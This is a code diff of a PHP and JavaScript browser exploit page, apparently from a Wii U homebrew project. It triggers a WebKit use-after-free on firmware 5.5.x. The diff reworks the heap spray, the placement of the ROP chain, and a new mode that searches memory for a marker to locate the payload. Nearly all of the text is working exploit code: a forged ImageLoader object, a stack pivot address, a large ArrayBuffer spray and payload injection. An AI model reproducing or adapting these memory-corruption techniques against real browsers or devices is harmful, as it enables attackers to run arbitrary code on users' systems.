@@ -2,8 +2,8 @@
 //Useful function
 function hexentities($str) {
     $return = '';
-    for($i = 0; $i < strlen($str); $i++) {
-        $return .= '0x'.bin2hex(substr($str, $i, 1)).', ';
+    for($i = 0; $i < strlen($str); $i += 4) {
+        $return .= '0x'.bin2hex(substr($str, $i, 4)).', ';
     }
     return $return;
 }
@@ -12,27 +12,31 @@ function hexentities($str) {
 $_REQUEST['sysver'] = '550'; // Currently hardcoded.
 $generatebinrop = 1; // Make sure the $ROPCHAIN will be in binary.
 
-$pivotAdress            = 0x010ADDCC; // don't change this.
-$payload_size_w_nops    = 0x20000; // the codegen is 128kb max.
-$pivotAdressAdress      = 0x1B800000; // where does this come from? Seems to be stable with the current spraying
+// Type 4 params
+$payload_tmp_address        = 0x1D000000;
+$payload_start_search       = 0x1B800000;
+$valid_payload_dst_address  = 0x1D500000;
+$payload_search_for         = 0xDEADAFFE;
 
-// These values could be adjusted to increase success rate.
-$payload_srcaddr        = 0x1D500000 - 0x00A10000;
-$payload_spray_size     = 0x400000;
+// Needed for ROP execution
+$pivotAdress                = 0x010ADDCC; // don't change this.
+$pivotAdressAdress          = 0x1B800000; // where does this come from? Seems to be stable with the current spraying
+$ROPHEAP                = $payload_tmp_address - 0x1000; //+ is a BAD idea as is may override our payload
 
-$ROPHEAP                = $payload_srcaddr - 0x1000; //+ is a BAD idea as is may override our payload
-
-$ropchainselect = 1; // Put codebin on heap and search it.
+//$ropchainselect = 1; // Put codebin on heap and search it.
 //$ropchainselect = 2; // Put codebin into ROP (Only works with reaaaaaally small payloads.
 //$ropchainselect = 3; // Print string at payload_srcaddr. 
+$ropchainselect = 4; // Print string at payload_srcaddr. 
 
 /**
  Expects a wiiuhaxx_common_cfg.php with the following variables
  
 $wiiuhaxxcfg_payloadfilepath = "code550.bin"; // The actual payload that will be loaded.
-$wiiuhaxxcfg_loaderfilepath = "wiiuhaxx_common/wiiuhaxx_loader.bin";
+$wiiuhaxxcfg_searchpayloadfilepath = "wiiuhaxx_common/wiiuhaxx_searcher.bin";
 **/
 require_once("wiiuhaxx_common/wiiu_browserhax_common.php");
+
+// Only call this once!
 generate_ropchain();
 ?>
 
@@ -43,24 +47,18 @@ Use after free https://bugs.chromium.org/p/chromium/issues/detail?id=240124
 Result: Bug is present, crash
 -->
 <script>
-function UaF(a){    
-    //Warning, the delta was modified !
-    var delta                   = 0x0<!--#echo var="delta" -->000000; //from 0x0 to 0x04000000 step by 0x01000000
+function UaF(a){
     var pivotAdress             = <?php echo $pivotAdress ?>;
     //5.5.2
     {
         var pivotAdressAdress   = <?php echo $pivotAdressAdress ?>; //r6
-        var payloadAdress       = <?php echo $payload_srcaddr ?> + delta;
     }
 
     var codegenAddress          = 0x01800000; // don't change this.
     var sizeWebCoreImageLoader  = 0x18;       // don't change this.
-    
-    var payloadsizeWithNOPs     = <?php echo $payload_size_w_nops; ?>;
-    var sprayCount              = <?php echo $payload_spray_size; ?>/payloadsizeWithNOPs;
-    var _4K                     = 0x1000;
-    var _16K                    = 0x4000;
-    var _32K                    = 0x8000;
+
+    var _16K                     = 0x4000;
+    var _4K                      = 0x1000;
     
     //radio is the *ONLY* type that left the freed WebCore::ImageLoader free !
     a.type="radio";
@@ -68,6 +66,7 @@ function UaF(a){
     //Allocate this new WebCore::ImageLoader over freed WebCore::
     var ab = new ArrayBuffer(sizeWebCoreImageLoader);
     var dv = new DataView(ab)
+    
     /*
     0:000:x86> dt webkit!WebCore::ImageLoader
        +0x000 __VFN_table : Ptr32
@@ -89,14 +88,16 @@ function UaF(a){
     dv.setUint32(0x10, 0x00000000);         //m_hasPendingBeforeLoadEvent
     dv.setUint32(0x14, 0x00000000);         //padding
 
-    <?php echo "var realROPChain = [" .  hexentities($ROPCHAIN) . "]"; ?> // creates "var realROPChain = [...];"
+    <?php echo "var realROPChain = [" .  hexentities($ROPCHAIN) . "]"; ?>
+    
+    <?php echo "var payload= [" . hexentities(wiiuhaxx_generatepayload()) . "];"; ?>
 
-    //Spray large ArrayBuffer with pivotAdress   
-    var ar = new Array(0x1800);
-    for(var i=0; i<0x1800; i++){
+    //Spray large ArrayBuffer with pivotAdress,  increase the spray for a bigger ROP exeuction chance (affects the position of the payload)
+    var ar = new Array(0x1800*2);
+    for(var i=0; i<0x1800*2; i++){
         ar[i] = new DataView(new ArrayBuffer(_4K));
-        for(var j=0; j<_4K; j+=4){
-            ar[i].setUint32(j, 0x10000000+j); //filler
+        for(var j=0; j<_4K; j+=8){
+            ar[i].setFloat64(j, 0x10000000+j); //filler
         }
 
         ar[i].setUint32(0x204, 0x0);
@@ -109,73 +110,19 @@ function UaF(a){
         //initialize this Rop Chain
         var ropCurrentOffset = 0x304;
         
-        //start of the Rop Chain                
+        //start of the Rop Chain 
         realROPChain.forEach(function(element) {
-            ar[i].setUint8(ropCurrentOffset, element);
-            ropCurrentOffset += 1;
+            ar[i].setUint32(ropCurrentOffset, element);
+            ropCurrentOffset += 4;
         });
     }
-     
-    //Spray final payload
-       
-    <?php if($ropchainselect != 3) echo "/*" ?>
-    
-    // little helper function.
-    function toHex(str) {
-        var hex = '';
-        for(var i=0;i<str.length;i++) {
-            hex += ''+str.charCodeAt(i).toString(16);
-        }
-        return hex;
+    var payloadBuffer = new DataView(new ArrayBuffer(_16K));
+    payloadBuffer.setUint32(0, <?php echo $payload_search_for ?>); // Place search for value
+    var curOffset = 4;
+    for(var curI = 0; curI< payload.length;curI++){
+        payloadBuffer.setUint32(curOffset,payload[curI]);
+        curOffset += 4;
     }
-
-    fillerID = 0;
-    var expected_payloadsize = 0x4000; // ~ the size of the HBL payload.
-    var ar2 = new Array(sprayCount);
-    for(var i=0; i<sprayCount; i++){
-        ar2[i] = new DataView(new ArrayBuffer(payloadsizeWithNOPs));
-        var curOffset = 0;
-        
-        for(var curNopI =0;curNopI < (payloadsizeWithNOPs) /8;curNopI++){                
-            var str = toHex(fillerID.toString(16)) + "00";                
-            while(str.length < 0x10){
-                if(curNopI > (payloadsizeWithNOPs - expected_payloadsize)/8){
-                    // if the string begins with "_" it would have collided with ourpayload
-                    str = "5F" + str;
-                }else{
-                    // if the string begins with "." everything would be okay.
-                    str = "2E" + str;
-                }
-            }
-            
-            ar2[i].setUint32(curOffset,parseInt(str.substr(0,8),16));
-            ar2[i].setUint32(curOffset+4,parseInt(str.substr(8,8),16));
-            curOffset += 8;
-            fillerID +=8;   
-        }
-    }
-    
-    <?php if($ropchainselect != 3) echo "*/" ?>
-    <?php if($ropchainselect == 3) echo "/*" ?>
-    
-    <?php echo "var payload= [" . hexentities(wiiuhaxx_generatepayload()) . "];"; ?>
-    var ar2 = new Array(sprayCount);
-    for(var i=0; i<sprayCount; i++){
-        ar2[i] = new DataView(new ArrayBuffer(payloadsizeWithNOPs));
-    }
-    for(var i=0; i<sprayCount; i++){
-        var curOffset = 0;
-        
-        for(var curNopI =0;curNopI < (payloadsizeWithNOPs - payload.length) / 4;curNopI++){                
-            ar2[i].setUint32(curOffset,0x60000000); // nop
-            curOffset += 4; 
-        }
-        
-        for(var curI = 0; curI< payload.length;curI++){
-            ar2[i].setUint8(curOffset++,payload[curI]);
-        }
-    }
-    <?php if($ropchainselect == 3) echo "*/" ?>
         
     //Use the new WebCore::ImageLoader & pivot !
     return 0;
